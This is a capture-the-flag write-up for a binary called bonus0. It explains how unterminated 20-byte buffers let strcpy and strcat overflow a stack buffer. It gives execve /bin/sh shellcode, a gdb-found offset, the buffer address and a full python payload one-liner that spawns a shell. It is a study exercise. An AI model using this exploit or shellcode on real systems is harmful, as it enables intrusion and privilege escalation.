# Stack shell code

## Context

The program take 2 input, each input is store inside a 20 byte buffer. Main declare a 54 byte buffer, store on the stack. First input is strcpy inside the and second is strcat. Normaly, this should'nt be vulnerable.

However, this code segfault easely

```bash
./bonus0 
 - 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 - 
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbb��� bbbbbbbbbbbbbbbbbbbb���
Segmentation fault (core dumped)
```

function p(), the one who read the input is the problem, it read in a buffer `char local_100c [4104];`, look for \n, replace it with \0 and strncpy inside the 20 byte buffer.

```c
  read(0,local_100c,0x1000);
  pcVar1 = strchr(local_100c,10);
  *pcVar1 = '\0';
  strncpy(param_1,local_100c,0x14);
```

It does this function twice, and the buffer are store next to each other in the stack.

So what happend if i write this "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n" ?

First call of p() func:

```c
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\0"
// but only 20byte are stored
"aaaaaaaaaaaaaaaaaaaa"
//no more '\0'
```

after two call of p() the value in the stack are :

```py
0xffffd288							0x61616161	0x61616161
0xffffd290:	0x61616161	0x61616161	0x61616161	0x62626262
0xffffd2a0:	0x62626262	0x62626262	0x62626262	0x62626262
```

When fist strcopy is call, to copy the first buffer[20] inside the main buffer[54], strcpy stop when it encounters a '\0', you know the one we did avoid.

So it strcpy aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbb��� : 43 byte write inside the buffer. Only 11 more value storable in the stack before overflow.

And we gonna overwrite the return value of the main when it gonna strcat bbbbbbbbbbbbbbbbb at the end of the first buffer.

## Exploit

The idea is to write the shell code in the buffer[4104] and overwritre main pointer to it.

Payload = Nop instruction + shell code (21byte) + feel the first buffer + \n + Offset + address of the shell code + fell the buffer + '\n'.

- Nope instruction to feel the first buffer. I did chooose 100.
- shell code : ```\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80``` (21 bytes)
- Feel the first buffer : read size (4096) - shell code - nope - \n
- '\n' are necessary, because if you forget them it segfault at ```pcVar1 = strchr(local_100c,10);```, if it doesn't find \n, it return null, and next step `*pcVar1 = '\0';` will segfault.
- offset : 9

```c
gef➤  pattern offset 0x65616161
[+] Searching for '61616165'/'65616161' with period=4
[+] Found at offset 9 (little-endian search) likely

 stopped 0x65616161 in ?? (), reason: SIGSEGV
```
- address of the shell code: print the buffer with gdb affter read: buffer address = 0xbfffe5e4

### Payload 

```bash
cat <(python2.7 -c 'import sys; sys.stdout.write(b"\x90" * 100 + b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + b"\x90" * 3974 + b"\n" + b"\x90" * 9 + b"\xe4\xe5\xff\xbf" + b"B" * 20 + b"\n")') - | ./bonus0
```